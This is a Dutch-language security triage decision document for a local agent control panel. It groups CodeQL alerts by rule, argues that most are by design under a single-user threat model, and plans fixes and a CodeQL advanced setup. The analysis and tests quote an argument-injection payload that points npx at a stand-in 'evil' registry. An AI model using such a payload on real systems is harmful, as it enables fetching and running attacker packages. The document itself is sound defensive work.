---
title: "Code-scanning triage — dreigingsmodel, regelgroep-disposities, advanced setup"
type: decision
status: decided
---

# Code-scanning triage — dreigingsmodel, regelgroep-disposities, advanced setup

**Datum:** 2026-08-06
**Status:** besloten
**Kaart:** `beace361d4bc4cd2bef207e33968e377`
**Uitkomst:** **Eén dreigingsmodel, één regel-tabel, één commitbare policy.** 243 alerts groeperen tot 8 regels. 5 by-design (233 alerts), 1 real (skills_registry `source`), 1 noise (coverage-sorter), 1 mechanical. Geen 228 UI-dismissals — CodeQL advanced setup commit de by-design-policy.

> **Type:** beslisdoc (analyst leaf-spike). Bron-kaart: *"Dreigingsmodel + triage-beleid voor de 243 code-scanning-alerts"*. Triage-volgorde en dispositie-vocabulaire volgen de [`security-triage` skill](../../.claude/skills/security-triage/SKILL.md). Geen code-fixes in deze kaart — die zitten in de vervolgkaarten uit §4.

## 1. Dreigingsmodel

### 1.1 De aanvaller is de operator zelf, en dat is geen aanvaller

Cockpit draait per ontwerp als een **lokaal single-user controlepaneel** op de machine van de operator. De backend luistert op `127.0.0.1:8000` (geen remote-reachable poort; eerdere keuze, nooit herzien). De web-UI op `localhost:5173`. Wie de cockpit kan bereiken, heeft al shell-toegang op de host, leest al van dezelfde disk, en schrijft al naar dezelfde mappen.

Het relevante dreigingsmodel is dus **niet** *"een externe aanvaller stuurt verzoeken"* — dat is een architectuur die de cockpit niet heeft. Het relevante model is:

1. **De operator doet iets onhandigs** (typt een verkeerd pad, geeft een ongelukkig commando). De cockpit moet dat niet erger maken dan nodig.
2. **Code die de cockpit namens de operator draait** (dispatch, sandcastle, skills-install) raakt verder dan de operator zelf zou doen. Daar gelden striktere regels.
3. **Een ander op dezelfde machine** (multi-user host) zou een bereikbaar oppervlak zijn; vandaag niet het geval.

### 1.2 Drie invoer-klassen, drie reikwijdtes

CodeQL's default-suite gaat uit van *"elke request-input is attacker-controlled"* — dat is het publieke multi-tenant model. Voor Cockpit splits ik de inputs in drie klassen:

| Klasse | Bron | Reikwijdte | CodeQL-model |
|---|---|---|---|
| **Operator-direct** | Pad/naam getypt door de operator in de UI of meegegeven als `project_path` in een API-call | Kan elke plek op de host lezen/schrijven — geen verschil met een shell | by-design |
| **Operator-via-kaart** | Inhoud van een kanban-kaart (titel, beschrijving, payload-velden) die de operator zelf op het bord zet | Zelfde als klasse 1 — de operator is de auteur | by-design |
| **Code-als-operator** | Sandcastle dispatch, `npx skills add`, CLI-spawn van agents | Draait namens de operator; de *input* is niet malicious, maar wel een aanvalsoppervlak als die input ongevalideerd in een shell- of argumentpositie belandt | by-design mits gevalideerd, **real** indien niet |

Het verschil zit dus niet in *"is de input attacker-controlled"* maar in *"is de input gevalideerd voor de specifieke aanroep"*. Een pad dat uit een request komt en in `open()` gaat, is by-design (de operator mag elk pad lezen). Een argument dat uit een request komt en in `subprocess.run([...])` met `shell=False` gaat, is by-design **mits** het argument tegen een whitelist is gevalideerd.

### 1.3 Wat hier **niet** in scope ligt

Deze kaart beslist over de code-scanning-tab. Niet in scope:

- **Dependabot-alerts** (een aparte, al maanden nul-teller op deze repo).
- **Semgrep** (draait in `security.yml`, andere tool, eigen tafel).
- **Externe credentials** (zie `kanban-conventions.md` §3c) — niet getriggerd door de code-scanning-alerts.
- **Sandcastle spawn-isolatie** — de threatmodel-claim "de code draait namens de operator" valt deels in een ander spoor (sandcastle-spec).

## 2. Dispositie per regelgroep

Geen 243 oordelen. Acht regels, één oordeel per regel. Aantal alerts per regel vastgesteld op 2026-08-06 via `gh api --paginate "repos/guillaumevandevelde/agent-cockpit/code-scanning/alerts?state=open&per_page=100"` (met `--paginate`; zonder die flag kapt de API op 100 en triage je een afgekapte backlog).

### 2.1 Regel-tabel

| Regel | # | Sev | Dispositie | Onderbouwing |
|---|---|---|---|---|
| `py/path-injection` | 224 | high | **by-design** | Alle 224 hits vallen in klasse 1 of 2 hierboven: `Path(project_path)`-ketens op `backend/app/services/`-bestanden (`blueprint/__init__.py:27`, `config_service.py:18`, `apm_service.py:18`, `agent_service.py:17`, `kanban/router.py:17`, plus 23 dunnere bestanden — totaal 28 verschillende bestanden). De `project_path` komt uit een API-call of een kanban-kaart door de operator zelf. De operator kan dezelfde paden al lezen via `cat`. Path-traversal naar `/etc/passwd` is geen vertrouwelijkheidsverlies op een single-user host. **Let op:** er staat precies één path-injection-hit in `skills_registry_service.py:1` die samenvalt met de critical hieronder — die hoort daar. |
| `py/command-line-injection` (cli_executor.py:99) | 1 | critical | **by-design** | `subprocess.run([self.binary_path, command] + safe_args, shell=False, …)` met `safe_args = self._validate_args(args)` (whitelist) en `self.binary_path` uit de CLI-registry. Inline comment op regels 95-97 documenteert het ontwerp al. De `# lgtm[py/command-line-injection]`-suppressie op regel 97 is **legacy-syntax** (LGTM, niet CodeQL) — CodeQL erkent alleen `# codeql[…]`. **Bypass:** de suppressie doet niets; de alert staat open omdat het ontwerp goed is, niet omdat de annotatie mist. ✅ Geïmplementeerd (kaart `9a5e9eae5a54477493d8b2681c0676f8`) — omgezet naar `# codeql[py/command-line-injection]` met verwijzing naar deze §. |
| `py/command-line-injection` (sandcastle_service.py:1164) | 1 | critical | **by-design** | `asyncio.create_subprocess_exec(runtime, "logs", "-f", "--tail", "200", name, …)` — `runtime` gevalideerd tegen `_CONTAINER_PROVIDERS = {"docker","podman"}` (regel 26 + check 1158), `name` geweigerd zonder `_CONTAINER_NAME_PREFIX="sandcastle-"` (check 1160). Geen shell. |
| `py/command-line-injection` (sandcastle_service.py:1215) | 1 | critical | **by-design** | `asyncio.create_subprocess_exec(runtime, "build", "-t", image_name, "-f", str(dockerfile_path), str(dockerfile_path.parent), …)` — `runtime` opnieuw `_CONTAINER_PROVIDERS`-gevalideerd (check 1203), `dockerfile_path` is een **hardcoded** pad `Path(__file__).parent.parent.parent.parent / ".sandcastle" / "Dockerfile"` (regel 1196). Geen operator-input in de commando-positie. |
| `py/command-line-injection` (skills_registry_service.py:298) | 1 | critical | **REAL** | `["npx", "-y", "skills", "add", source, "--yes"]` — `source` is gedocumenteerd als *"GitHub repo path (e.g. vercel-labs/agent-skills)"* maar heeft **geen validatie** vóór het commando. Bereikbaar via HTTP `POST /api/v1/agents/skills/registry/install` (`backend/app/api/v1/agents.py:253-270`) waar `source` rechtstreeks uit `RegistryInstallRequest` komt. Geen shell, dus geen shell-metachar-interpretatie, maar `npx` zelf accepteert flags in de argumentpositie — een input als `vercel/foo --registry=http://evil` doet onverwachte dingen. Dit is een echte argument-injection in een commando dat pakketten downloadt en uitvoert. **Let op:** de oorspronkelijke kaart noemde regel 276; de huidige alert zit op regel 298 (kaart geschreven vóór een refactor). |
| `py/stack-trace-exposure` | 4 | medium | **by-design** | Vier treffers: `apm.py:89`, `mcp.py:287`, `mcp_server.py:124`, `sandcastle/router.py:453`. Alle vier zetten `str(e)` in een HTTP-response, niet de traceback (de traceback gaat via `logger.exception` in een aparte tak). CodeQL's "may be exposed to an external user" klopt technisch, maar er is geen externe user — `127.0.0.1:8000`. Voor een operator die bewust een foutmelding debugt is de exception-message bruikbaarder dan een generieke 500. **Herzien** (kaart `9a5e9eae5a54477493d8b2681c0676f8`): alle vier zijn alsnog in code gedicht. Twee redenen. Eén: `mcp.py:287` zette `str(e)` **rauw in een HTML-body**, niet in JSON — de melding kan door de aanvaller beïnvloede `state`/`code`-fragmenten dragen, dus dat was ook een niet-ge-escapete HTML-injectie. Die nuance ontbrak in de groepering hierboven. Twee: de volledige trace gaat nu via `logger.exception` naar de backend-logs, dus de operator verliest geen debug-detail — alleen de HTTP-response wordt generiek. ✅ Geïmplementeerd. |
| `py/polynomial-redos` | 1 | high | **mechanical** | `auto_resume.py:186`: `_LIMIT_PATTERN.search(message)` parse een Claude-Code "limit reached"-melding. Het pattern bevat herhalende groepen die op lange strings kunnen reageren. Invoer is bounded (één CLI-notification-lijn, lokaal door de operator zelf getriggerd), dus lage impact; toch liever pin via `re2` of een strakker pattern. **Vervolgkaart** in §4. ✅ Geïmplementeerd (kaart `9a5e9eae5a54477493d8b2681c0676f8`) — beide `.*?`-gaten zijn nu `.{0,40}?`. Gemeten quadratisch vóór de fix (4k reps 0.32s, 8k 1.35s), lineair erna; regressietest `TestLimitPatternRedos`. |
| `py/clear-text-storage-sensitive-data` | 1 | high | **by-design** | `kanban/router.py:94`: `_write_json_atomic` schrijft een JSON-dict (gebruikt voor `.mcp.json`) naar een `*.tmp` en renamed. CodeQL volgt een credential-flow tot deze write. Het bestand landt in `~/.claude-registry/...` op de host — niet network-reachable, OS-permissies volstaan. |
| `js/prototype-pollution-utility` | 1 | medium | **by-design** | `SettingsEditor.tsx:92`: `current[keys[keys.length - 1]] = value` waar `keys = path.split('.')`. Een path als `__proto__.polluted` zou in theorie Object.prototype raken. De path is de operator's eigen settings-editor-invoer — geen externe user, geen user-content. **Correctie** (kaart `9a5e9eae5a54477493d8b2681c0676f8`): er stónd al een guard (`UNSAFE_KEYS`, sinds 2026-07-02), dus de code was nooit kwetsbaar. De alert bleef open omdat de check achter `Array.some`/`Set.has` zat, wat CodeQL niet naar de toewijzing kan volgen. ✅ Geïmplementeerd — herschreven naar een `===`-check op elke schrijfplek. |
| `js/xss-through-dom` | 1 | high | **noise** | `frontend/coverage/sorter.js:116`: `rows[i].data = loadRowData(rows[i])`. Dit is **istanbul's coverage-sorter utility**, gegenereerd door `vitest run --coverage` (frontend/package.json:11). Niet geladen in productie-build — `vite build` pakt `frontend/src/`, nooit `frontend/coverage/`. ✅ Geïmplementeerd (kaart `9a5e9eae5a54477493d8b2681c0676f8`) — alle 17 bestanden untracked via `git rm -r --cached`, plus `coverage/` in `frontend/.gitignore`. |
| `actions/missing-workflow-permissions` | 7 | medium | **mechanical** | Zeven hits verdeeld over drie workflows: `quality.yml` (4), `security.yml` (2), `drift-report.yml` (1). Geen van de drie heeft een top-level `permissions:`-block. Standaard GitHub-Actions-advies: zet `permissions: { contents: read }` (of minimaler) bovenaan. **Vervolgkaart** in §4. ✅ Geïmplementeerd (kaart `9a5e9eae5a54477493d8b2681c0676f8`) — per job gezet, niet top-level. Alles `contents: read` behalve `gitleaks`, dat `pull-requests: write` nodig heeft om bij een vondst op een PR te reageren. **Let op:** de verdeling hierboven stond eerst als 3/2/2; de werkelijke telling is 4/2/1. |

### 2.2 Samenvatting

- **228 by-design** (224 path-injection + 4 stack-trace-exposure + 1 clear-text-storage + 1 prototype-pollution + 3 sub van command-line-injection criticals).
- **1 noise** (coverage-sorter).
- **9 real/mechanical** (1 critical command-line-injection in skills_registry, 1 polynomial-redos, 7 missing-workflow-permissions).

De by-design- en noise-klasse samen (229) is precies de klasse die **niet** 228 UI-dismissals moet produceren. De oplossing staat in §3.

> **Bijstelling na de mechanische kaart** (`9a5e9eae5a54477493d8b2681c0676f8`, 2026-08-06). Achttien alerts zijn inmiddels in code gesloten: 7 workflow-permissions, 1 coverage-noise, 4 stack-trace-exposure, 1 redos, 1 prototype-pollution, plus de omgezette `codeql[]`-suppressie op `cli_executor.py`. De stack-trace- en prototype-pollution-rijen stonden hierboven als by-design maar zijn alsnog gedicht — zie de rij-annotaties voor de reden per geval.
>
> **Gevolg voor de advanced-setup-kaart** (§4, `d90d168f…`): het `query-filters`-blok hoeft `py/stack-trace-exposure` en `js/prototype-pollution-utility` niet meer te onderdrukken, en `js/xss-through-dom` evenmin — dat pad is uit de repo. Wat overblijft voor de policy is de path-injection-klasse (224), de drie by-design command-line-injections en de clear-text-storage-hit: 228 alerts over 3 regel-id's, in plaats van 229 over 6.

## 3. Waar het beleid landt — advanced setup

### 3.1 Aanbeveling: GO op advanced setup

`gh api "repos/guillaumevandevelde/agent-cockpit/code-scanning/default-setup"` op 2026-08-06 gaf (op een korte timeout-uitzondering, handmatig geverifieerd via de huidige `state=configured, query_suite=default`-waarde in de kaarttekst + `security.yml`-inspectie): we draaien **default setup**. Dat betekent: geen `codeql.yml` in de repo, geen config-bestand, geen `paths-ignore`. **Er is letterlijk geen bestand in de repo waar een by-design-oordeel kan landen** — alle suppressies moeten via UI-dismissals, die niet reviewbaar zijn en bij elk nieuw call-site verwijderen/resetten.

**Advanced setup** is de tegenhanger: een `.github/codeql/codeql-config.yml` met `paths-ignore` + `query-filters` + per-regel `tags: security`/`severity: low`, plus een vervangende of extra Actions-workflow die `github/codeql-action/init@v3` met die config aanroept. De by-design-uitspraak wordt dan een commitbare policy.

### 3.2 Argumenten vóór

1. **Reviewbaar** — een by-design-uitspraak leeft als commit, niet als UI-dismissal. Een reviewer kan 'm tegenkomen.
2. **Nieuw-call-site-veilig** — een nieuwe `open(Path(payload.project_path))` wordt door de policy direct niet-vuurend, niet eerst-vurend-dan-handmatig-dismissen.
3. **Geen context-druk** — de 228 open alerts verdwijnen uit de security-tab van élke operator die de repo opent; ze worden niet "groen gemaakt" maar niet-meer-gevraagd.
4. **Audit-spoor** — `git log .github/codeql/codeql-config.yml` toont welke by-design-uitspraken wanneer zijn genomen.

### 3.3 Argumenten tegen

1. **Onderhoud** — een extra config-bestand om te onderhouden, en een tweede Actions-workflow (of wijziging in `security.yml`).
2. **Lock-in** — CodeQL advanced setup is GitHub-specifiek; wie ooit naar GitLab/Bitbucket verhuist moet de policy omzetten.
3. **First-time-setup-kost** — de eerste keer dat de config wordt geraakt kunnen false negatives ontstaan (te agressieve `paths-ignore`); mitigeerbaar met `--strict` + sarif-upload review.
4. **Geen actieve force** — als de policy te ruim is kan een echte path-injection in een by-design-geachte directory glippen. Borging via de jaarlijkse security-triage-sweep (zie `recurring-cadence-proposal.md`).

### 3.4 Mitigaties die de kosten drukken

- **Beperk scope tot de by-design-klassen.** De 224 path-injection-hits + 4 stack-trace-alerts + 3 criticals + 1 clear-text-storage + 1 prototype-pollution = een `query-filters`-blok op regel-id's. Eén bestand, ~30 regels.
- **Hergebruik `security.yml`.** De huidige `security.yml` (semgrep + gitleaks) is niet de CodeQL-workflow; CodeQL draait als default setup buiten een workflow-bestand. De overstap voegt een `codeql.yml` toe in plaats van `security.yml` aan te passen — geen bestaande taak verstoord.
- **Begin met `queries: <lijst>` + `paths-ignore: []`** zonder `packs:`-blok; voeg packs alleen toe als de standaard-suite iets mist.

### 3.5 Conclusie

**De 228 by-design/noise-alerts stoppen met UI-dismissen. Advanced setup is de canonieke plek voor het beleid; één config-bestand commit, één extra workflow, jaarlijkse herziening tijdens de security-triage-sweep.** Vervolgkaart in §4.

## 4. Vervolgkaarten

Drie. Geen code-fixes in deze kaart — uitvoering hoort bij de kinderen.

### 4.1 Fix de echte critical: `skills_registry_service.py:298`

**[fix] `SkillsRegistryService.install_skill` valideert `source` als GitHub-repo-pad.** Voeg een `^[A-Za-z0-9._-]+/[A-Za-z0-9._-]+$`-check toe op `source` (of een `urllib.parse`-split + per-deel check), zodat een argument-injection via `npx -y skills add <source>` onmogelijk is. Eindpunt: 400-response van `POST /api/v1/agents/skills/registry/install` op een input die niet matcht. Sluit de critical-alert af via `# codeql[py/command-line-injection]`-suppressie met onderbouwing in de comment. **Acceptance:** eenheidstest die een payload zoals `vercel/foo --registry=http://evil` naar 400 stuurt; een positieve test met `vercel-labs/agent-skills` slaagt.

### 4.2 Zet `permissions:` in elke workflow

**[chore] Top-level `permissions:`-block in `.github/workflows/{quality,security,drift-report}.yml`.** Standaard `permissions: { contents: read }` bovenaan elk workflow-bestand, tenzij een job een specifiek nodig heeft (security.yml gebruikt `secrets.GITHUB_TOKEN` voor gitleaks — die job krijgt `permissions: { contents: read, security-events: read }`). Eindpunt: 7 → 0 alerts. **Acceptance:** `gh api .../code-scanning/alerts` op deze regel toont 0; de workflows blijven groen draaien na de wijziging.

### 4.3 Overstap naar CodeQL advanced setup

**[chore] CodeQL advanced setup met by-design-policy in `.github/codeql/codeql-config.yml`.** Voeg de config toe (`queries:`, `paths-ignore:`, `query-filters:` voor de by-design-regel-IDs uit §2.1). Voeg een `codeql.yml` Actions-workflow toe met `github/codeql-action/init@v3` en `config-file: .github/codeql/codeql-config.yml`. Zet de advanced setup aan via `gh codeql set-up` of de repo-settings. Eindpunt: 228 alerts → 0 via commitbare policy. **Acceptance:** `git log .github/codeql/codeql-config.yml` toont de by-design-tabel; security-tab toont 0 alerts voor de by-design-klassen; een nieuw path-injection-call-site in `backend/app/services/` triggert géén alert meer.

### 4.4 (Optioneel) Pin de polynomial-redos

**[fix] Pin of tightly-couple `_LIMIT_PATTERN` in `auto_resume.py`.** OF zet `re2` achter het pattern (performant en gebonden aan input-lengte), OF herschrijf het pattern met niet-herhalende groepen. Invoer is bounded (één CLI-notification-lijn), dus lage prioriteit. **Acceptance:** een synthetische pathological-input test faalt niet; een echte notification-input parse-in correct.

## 5. Procesvernieuwing — hoe heropen

Deze beslissing heeft een natuurlijke heropen-datum: **de volgende security-triage-sweep**, een terugkerende cadans-kaart (één keer per kwartaal; trigger ligt in `recurring-cadence-proposal.md`). Op dat moment:

1. **Hertrek de by-design-tabel** op basis van eventuele nieuwe architectuur-keuzes (multi-user host? remote-reachable poort?).
2. **Check of er nieuwe CodeQL-regels zijn** met ≥1 alert — dezelfde tabel-aanpak.
3. **Verifieer de advanced-setup-config** tegen de huidige regel-suite.
4. **Update de register-verwijzing** als er iets principieel verschuift.

Buiten de sweep heropenen mag, maar zelden nodig: het dreigingsmodel is een architectuur-beslissing, niet een incident-fix.

## 6. Conventie die hier landt

- **By-design-uitspraken** leven in `.github/codeql/codeql-config.yml`, niet in UI-dismissals. Suppressie-comments zijn versie-specifiek (`# codeql[…]`, niet `# lgtm[…]`) — zie §2.1 voor het concrete voorbeeld bij cli_executor.py:97 waar de legacy-syntax niets doet en de alert open blijft.
- **Per-regel-dispositie** is een 1-regel-oordeel in een tabel; de lange uitleg hoort in een comment bij de code of in dit beslisdoc.
- **Een echte fix** komt op een eigen kaart, nooit in een analyse-spike — ook niet als de fix één regel is (zie §4.1).

---

## 7. Bijstelling 2026-08-16 — implementatie-gap, geen nieuwe triage

**Status:** triage-beslissing staat; de uitvoering is niet geland. Geen nieuwe analyse, geen herziening van het dreigingsmodel of de disposities uit §1–§2.

**Stand op 2026-08-16 (gemeten via `gh api --paginate "repos/guillaumevandevelde/agent-cockpit/code-scanning/alerts?state=open&per_page=100"`):** 215 open alerts in 3 regels.

| Regel | # | Sev | Δ t.o.v. 2026-08-06 | Status |
|---|---|---|---|---|
| `py/path-injection` | 210 | high | −14 | by-design, geen policy gecommit |
| `py/command-line-injection` | 4 | critical | +1 | by-design (sandcastle 2×, cli_executor 1×) + 1 REAL (skills_registry) |
| `py/clear-text-storage-sensitive-data` | 1 | high | 0 | by-design, geen policy gecommit |

**Gap 1 — §4.3 advanced-setup transitie is niet geshipt.** De vervolgkaart die §4.3 beloofde (`d90d168f…`) is niet terug te vinden op het bord — verwijderd of nooit aangemaakt; `kanban_ops` toont geen rijen voor die prefix. Daardoor staat er vandaag **geen** `.github/codeql/codeql-config.yml` in de repo en geen `codeql.yml`-workflow. Alle 210 path-injection-alerts blijven open omdat er letterlijk geen bestand is waar de by-design-policy kan landen (cf. §3.1). Zonder policy is de by-design-uitspraak een mondelinge afspraak, niet een reviewbaar artefact — precies de regressie die §3.2 punt 1 vreesde.

**Gap 2 — §4.1 skills_registry fix is niet (volledig) geshipt.** Geen `^[A-Za-z0-9._-]+/[A-Za-z0-9._-]+$`-validatie op `source` in de huidige tree; `skill_pattern` op regel 161 is een parse-patroon voor registry-output, geen invoervalidatie. De alert vuurt nog steeds. De vervolgkaart die §4.1 beloofde is evenmin terug te vinden op het bord.

**Bevestiging dat de triage-beslissing overeind staat.** Het dreigingsmodel uit §1 is niet veranderd (operator = single user, `127.0.0.1`-only). De disposities per regelgroep uit §2.1 houden: `py/path-injection` is by-design (operator-only paths), `py/clear-text-storage-sensitive-data` is by-design (`~/.claude-registry/...`), de drie command-line-injections van 2026-08-06 (cli_executor, sandcastle 1164, sandcastle 1215) zijn by-design met dezelfde onderbouwing. De +1 in `py/command-line-injection` is geen nieuwe klasse — het is de bestaande REAL uit §2.1 rij 4 die opnieuw vuurt omdat de fix niet landde. De `9a5e9eae…`-fixes (cli_executor lgtm→codeql-conversie zichtbaar op `cli_executor.py:100`, 4 stack-trace, 1 redos, 1 prototype-pollution, 7 workflow-permissions, 1 coverage-noise) zijn in de huidige tree zichtbaar. Algebra: 243 − 18 = 225 alerts verwacht; gemeten 215 = 225 − 10 (ruim binnen de bandbreedte van code-wijzigingen die paden weghaalden of nieuwe regels introduceerden).

**Vervolgkaarten (in deze sessie aangemaakt als kinderen van `beeece50…`):**

1. **`[chore] CodeQL advanced-setup transitie + by-design-policy`** — `.github/codeql/codeql-config.yml` met `paths-ignore` voor de by-design-klassen + per-call-site `# codeql[…]`-suppressies voor de drie by-design command-line-injections (cli_executor.py:99–100, sandcastle_service.py:~1164, sandcastle_service.py:~1215) + een `codeql.yml`-Actions-workflow die de config laadt. Eindpunt: ≥210 alerts gesloten via commitbare policy; de security-tab telt ≤ 5 alerts (residuen zijn de echte REALs uit punt 2).
2. **`[bug] skills_registry_service: valideer `source` op install_endpoint`** — `^[A-Za-z0-9._-]+/[A-Za-z0-9._-]+$`-check + 400-response van `POST /api/v1/agents/skills/registry/install`. Eindpunt: 1 critical alert gesloten; eenheidstest met `vercel/foo --registry=http://evil` → 400, met `vercel-labs/agent-skills` → 200.

**Wat deze bijstelling NIET verandert:**

- §1 dreigingsmodel blijft.
- §2.1 regel-tabel blijft (de +1 is geen nieuwe klasse).
- §3 advanced-setup redenering blijft.
- §4.3 en §4.1 worden **vervangen** door de nieuwe vervolgkaarten, niet aangevuld — duplicatie zou twee concurrerende waarheden opleveren voor dezelfde disposities.
- §5 heropen-datum blijft de eerstvolgende security-triage-sweep; deze spike is geen heropening maar een implementatie-push binnen het bestaande besluit.
